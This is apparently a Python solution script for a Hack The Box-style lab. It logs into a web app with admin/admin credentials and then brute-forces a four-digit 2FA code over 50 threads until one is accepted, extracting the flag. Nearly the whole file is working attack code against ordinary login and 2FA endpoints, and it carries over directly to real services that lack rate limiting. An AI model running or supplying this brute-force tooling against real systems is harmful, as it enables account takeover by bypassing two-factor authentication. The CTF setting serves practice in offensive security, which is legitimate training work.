#!/usr/bin/env python3
"""
OTP Brute Force Script
======================
This script performs a brute force attack against a two-factor authentication (2FA) system
by systematically trying all possible 4-digit OTP codes (0000-9999) until a valid one is found.
The script uses multi-threading to speed up the brute force process.
"""

import requests  # For making HTTP requests to the target web application
import re        # For regular expression pattern matching to extract flags and validate responses
from concurrent.futures import ThreadPoolExecutor, as_completed  # For multi-threaded OTP brute forcing

def brute_force_otp(session, otp_url, headers, proxies, otp):
    """
    Attempts to authenticate using a specific OTP code against the 2FA endpoint.
    
    This function takes a single OTP value, formats it as a 4-digit string, and submits
    it to the 2FA authentication endpoint. If the OTP is valid (doesn't return an error),
    it returns the OTP and response for further processing.
    
    Args:
        session: Authenticated requests session with login cookies
        otp_url: URL endpoint for 2FA verification (typically /2fa.php)
        headers: HTTP headers to include with the request
        proxies: Proxy configuration (currently set to None)
        otp: Integer OTP value to test (0-9999)
        
    Returns:
        dict: Contains 'otp' and 'response_text' if successful, None if invalid OTP
    """
    # Convert the integer OTP to a zero-padded 4-digit string (e.g., 1 becomes "0001")
    otp_str = f"{otp:04d}"
    
    # Prepare the POST data payload containing the OTP code
    # This mimics the form data that would be submitted by a legitimate user
    otp_data = {
        "otp": otp_str
    }

    # Submit the OTP to the 2FA endpoint and capture the response
    # verify=False disables SSL certificate verification (useful for testing environments)
    # proxies=None means no proxy is used (despite the proxies parameter being passed in)
    otp_resp = session.post(otp_url, headers=headers, data=otp_data, proxies=None, verify=False)

    # Check if the response indicates a valid OTP by looking for the absence of error messages
    # If "Invalid 2FA Code" is NOT in the response, we assume the OTP was accepted
    if "Invalid 2FA Code" not in otp_resp.text:
        # Create a dictionary containing both the successful OTP and the full response text
        # The response text may contain flags or other important information
        data_dict = {"otp": otp_str, "response_text": otp_resp.text}
        return data_dict

    # Return None if the OTP was invalid (error message was found in response)
    return None

if __name__ == "__main__":
    # ============================================================================
    # PHASE 1: Initialize HTTP Session and Authentication Setup
    # ============================================================================
    
    # Create a persistent HTTP session that will maintain cookies and session state
    # This is crucial for maintaining authentication state between login and 2FA steps
    session = requests.Session()

    # Define HTTP headers to mimic a legitimate browser request
    # User-Agent helps avoid basic bot detection mechanisms
    # Content-Type specifies that we're sending form-encoded data
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    # Target application configuration
    # These values should be updated to match the specific target environment
    base_url = 'http://94.237.49.23:38646'  # Base URL of the target web application
    login_url = f"{base_url}/index.php"     # Login endpoint URL
    
    # Login credentials - these appear to be default/weak credentials
    # In a real assessment, these might be discovered through reconnaissance or credential stuffing
    login_data = {
        "username": "admin",
        "password": "admin"
    }
    
    # Proxy configuration for traffic interception/analysis (currently unused)
    # This would typically point to Burp Suite or another intercepting proxy
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080",
    }

    # ============================================================================
    # PHASE 2: Perform Initial Authentication (Username/Password)
    # ============================================================================
    
    # Reinitialize session (redundant but ensures clean state)
    session = requests.Session()
    
    # Attempt to log in with the provided credentials
    # proxies=None means we're not using the proxy configuration defined above
    login_resp = session.post(login_url, headers=headers, data=login_data, proxies=None, verify=False)
    # ============================================================================
    # PHASE 3: Validate Successful Login and Detect 2FA Requirement
    # ============================================================================
    
    # Use regex to search for indicators that login was successful and 2FA is required
    # This pattern looks for HTML heading tags containing "Two Factor Authentication"
    # The \d+ matches any number of digits (h1, h2, h3, etc.), .* matches any characters
    success_pattern = r"<h\d+>.*Two Factor Authentication.*</h\d+>"
    match = re.search(success_pattern, login_resp.text)

    # If we found the 2FA message, proceed with the OTP brute force attack
    if match:
        print("[+] Login successful, proceeding to OTP brute-force...")
        print(f"[+] Found message: {match.group()}")

        # ========================================================================
        # PHASE 4: Configure Multi-threaded OTP Brute Force Parameters
        # ========================================================================
        
        # Threading configuration for optimal performance vs. server stability
        max_threads = 50     # Number of concurrent threads (adjust based on target capacity)
        max_range = 9999     # Maximum OTP value to test (4-digit codes: 0000-9999)
        batch_size = 1000    # Process OTPs in batches to manage memory and avoid overwhelming target

        # ========================================================================
        # PHASE 5: Execute Batched Multi-threaded OTP Brute Force Attack
        # ========================================================================
        
        # Process the full OTP range in manageable batches
        # This approach helps manage memory usage and allows for progress monitoring
        for batch_start in range(0, max_range + 1, batch_size):
            # Create a new thread pool executor for each batch
            # This ensures clean thread management and resource cleanup
            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                futures = []  # List to store future objects for async operations
                
                # Submit individual OTP attempts to the thread pool
                # Each iteration creates one thread to test one specific OTP value
                for otp in range(batch_start, min(batch_start + batch_size, max_range + 1)):
                    # Format OTP as 4-digit string for this iteration (redundant with function, but clear)
                    otp_str = f"{otp:04d}"
                    
                    # Prepare the data payload (redundant here, but shows the structure)
                    otp_data = {
                        "otp": otp_str
                    }

                    # Construct the 2FA endpoint URL
                    otp_url = f"{base_url}/2fa.php"
                    
                    # Submit the brute force task to the thread pool
                    # executor.submit() returns a Future object that will contain the result
                    futures.append(executor.submit(
                        brute_force_otp,  # Function to execute
                        session,          # Authenticated session with login cookies
                        otp_url,         # 2FA verification endpoint
                        headers,         # HTTP headers for the request
                        proxies,         # Proxy configuration (unused in function)
                        otp              # The specific OTP value to test
                    ))

                # ================================================================
                # PHASE 6: Process Results and Extract Flag
                # ================================================================
                
                # Process completed futures as they finish (not necessarily in order)
                # as_completed() yields futures as they complete, enabling real-time processing
                for future in as_completed(futures):
                    otp_resp = future.result()  # Get the result from the completed thread
                    
                    # Check if this thread found a valid OTP (non-None return value)
                    if otp_resp:
                        resp_dict = otp_resp  # Extract the response dictionary
                        print(f"[+] Valid OTP found: {resp_dict['otp']}")
                        
                        # Check if the response contains a CTF flag (starts with "HTB{")
                        # This indicates we've successfully bypassed 2FA and accessed protected content
                        if "HTB{" in resp_dict['response_text']:
                            # Use regex to extract the complete flag from the response
                            # Pattern: HTB{ followed by any characters except }, then closing }
                            flag_match = re.search(r'HTB\{[^}]*\}', resp_dict['response_text'])
                            
                            # If we successfully extracted a flag, print it and exit
                            if flag_match:
                                print(flag_match.group())  # Print only the flag itself
                        
                        # Exit immediately after finding the first valid OTP
                        # This prevents unnecessary continued brute forcing
                        exit(0)